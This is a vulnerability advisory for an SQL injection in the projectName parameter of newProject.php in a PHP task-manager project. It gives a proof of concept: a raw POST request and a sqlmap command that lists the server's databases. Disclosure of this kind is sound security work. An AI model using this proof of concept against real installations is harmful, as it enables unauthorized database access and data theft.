# Task_Manager_In_PHP has sql injection vulnerability in newProject.php

## supplier
https://code-projects.org/task-manager-in-php-with-source-code/
## Vulnerability file
newProject.php
## describe
An unrestricted SQL injection attack exists in Task_Manager_In_PHP.   The parameters that can be controlled are as follows: projectName . This function executes the projectName parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

## code analysis

The projectName parameter in newProject.php is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection.

![image-20241111104313092](https://github.com/user-attachments/assets/9fe6e51e-6fd4-4d6c-b7a6-77c06c901ebe)

Injection via parameter projectName

## POC

```
POST /newProject.php HTTP/1.1
Host: taskmanager
Content-Length: 59
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://taskmanager
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://taskmanager/Projects.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

projectName=1*&priority=Low&createProject=%E6%8F%90%E4%BA%A4
```

save as 3.txt

```
python sqlmap.py -r 3.txt --dbs
```

![image-20241111104425987](https://github.com/user-attachments/assets/63872fc4-1e2d-4083-986c-6261b968775e)

Get the database name: farmacia

![image-20241111104505767](https://github.com/user-attachments/assets/8cc61cd4-8211-460e-9e41-dd7f2082c2c2)



**Discover**

西安电子科技大学 李腾，谢亚轩